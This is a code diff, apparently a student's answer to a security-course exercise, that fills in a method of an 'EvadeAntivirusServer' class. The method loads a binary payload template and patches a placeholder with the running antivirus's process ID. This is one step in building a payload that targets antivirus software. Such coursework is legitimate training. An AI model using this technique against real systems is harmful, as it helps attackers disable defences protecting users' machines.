@@ -1,4 +1,8 @@
+import addresses
 import evasion
+
+# unusual value to overide with run time pid of the antivirus
+UNUSUAL_PID_VALUE_FOR_BIN_PATCH = 0x12345678
 
 
 class SolutionServer(evasion.EvadeAntivirusServer):
@@ -17,8 +21,13 @@ class SolutionServer(evasion.EvadeAntivirusServer):
              The bytes of the payload.
         """
         PATH_TO_TEMPLATE = './q4.template'
-        # TODO: IMPLEMENT THIS FUNCTION
-        raise NotImplementedError()
+        pid_in_bytes = addresses.address_to_bytes(pid)
+        with open(PATH_TO_TEMPLATE, "r+b") as read_writer:
+            general_payload = read_writer.read()
+
+        general_payload = general_payload.replace(addresses.address_to_bytes(UNUSUAL_PID_VALUE_FOR_BIN_PATCH), pid_in_bytes)
+        payload = general_payload
+        return payload
 
     def print_handler(self, product: bytes):
         # WARNING: DON'T EDIT THIS FUNCTION!
